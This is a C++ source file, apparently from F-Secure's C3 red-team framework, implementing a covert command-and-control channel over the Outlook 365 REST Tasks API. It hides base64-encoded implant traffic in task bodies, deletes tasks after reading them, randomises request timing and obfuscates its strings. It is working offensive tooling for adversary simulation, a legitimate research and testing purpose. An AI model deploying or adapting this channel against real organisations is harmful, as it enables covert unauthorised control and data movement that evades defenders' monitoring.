#include "StdAfx.h"
#include "Outlook365RestTask.h"
#include "Common/FSecure/Crypto/Base64.h"
#include "Common/FSecure/CppTools/ScopeGuard.h"
#include "Common/json/json.hpp"
#include "Common/FSecure/CppTools/StringConversions.h"
#include "Common/FSecure/WinHttp/HttpClient.h"
#include "Common/FSecure/WinHttp/Constants.h"
#include "Common/FSecure/WinHttp/Uri.h"

// Namespaces
using json = nlohmann::json;
using base64 = cppcodec::base64_rfc4648;
using namespace FSecure::StringConversions;
using namespace FSecure::WinHttp;

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::Crypto::String FSecure::C3::Interfaces::Channels::Outlook365RestTask::ItemEndpoint = OBF("https://outlook.office.com/api/v2.0/me/tasks/");
FSecure::Crypto::String FSecure::C3::Interfaces::Channels::Outlook365RestTask::ListEndpoint = OBF("https://outlook.office.com/api/v2.0/me/tasks");
FSecure::Crypto::String FSecure::C3::Interfaces::Channels::Outlook365RestTask::TokenEndpoint = OBF("https://login.windows.net/organizations/oauth2/v2.0/token/");
FSecure::Crypto::String FSecure::C3::Interfaces::Channels::Outlook365RestTask::Scope = OBF("https://outlook.office365.com/.default");

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Channels::Outlook365RestTask::Outlook365RestTask(ByteView arguments)
	: Office365<Outlook365RestTask>(arguments)
{

}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t FSecure::C3::Interfaces::Channels::Outlook365RestTask::OnSendToChannel(ByteView data)
{
	RateLimitDelay(m_MinUpdateDelay, m_MaxUpdateDelay);

	try
	{
		// Construct the HTTP request
		auto webClient = HttpClient{ Convert<Utf16>(ItemEndpoint.Decrypt()), m_ProxyConfig };
		auto request = CreateAuthRequest(Method::POST);

		auto chunkSize = std::min<size_t>(data.size(), base64::decoded_max_size(4 * 1024 * 1024) ); // Send max 4 MB.
		auto fileData = json();
		fileData[OBF("Subject")] = m_OutboundDirectionName;
		fileData[OBF("Body")][OBF("Content")] = base64::encode(&data.front(), chunkSize);
		fileData[OBF("Body")][OBF("ContentType")] = OBF("Text");

		auto body = fileData.dump();
		request.SetData(ContentType::ApplicationJson, { body.begin(), body.end() });
		EvaluateResponse(webClient.Request(request));

		return chunkSize;
	}
	catch (std::exception & exception)
	{
		Log({ OBF_SEC("Caught a std::exception when running OnSend(): ") + exception.what(), LogMessage::Severity::Error });
		return 0u;
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::Outlook365RestTask::OnReceiveFromChannel()
{
	RateLimitDelay(m_MinUpdateDelay, m_MaxUpdateDelay);

	auto packets = std::vector<ByteVector>{};
	try
	{
		auto fileList = ListData(OBF("?top=1000&filter=startswith(Subject,'") + m_InboundDirectionName + OBF("')&orderby=CreatedDateTime"));

		for (auto& element : fileList.at(OBF("value")))
			packets.push_back(base64::decode<ByteVector, std::string>(element.at(OBF("Body")).at(OBF("Content"))));

		for (auto& element : fileList.at(OBF("value")))
			RemoveItem(element.at(OBF("Id")));
	}
	catch (std::exception& exception)
	{
		Log({ OBF_SEC("Caught a std::exception when running OnReceive(): ") + exception.what(), LogMessage::Severity::Warning });
	}

	return packets;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::Outlook365RestTask::OnRunCommand(ByteView command)
{
	auto commandCopy = command; // Each read moves ByteView. CommandCoppy is needed  for default.
	switch (command.Read<uint16_t>())
	{
	case 0:
		try
		{
			RemoveAllItems();
		}
		catch (std::exception const& e)
		{
			Log({ OBF_SEC("Caught a std::exception when running RemoveAllFiles(): ") + e.what(), LogMessage::Severity::Error });
		}
		return {};
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}
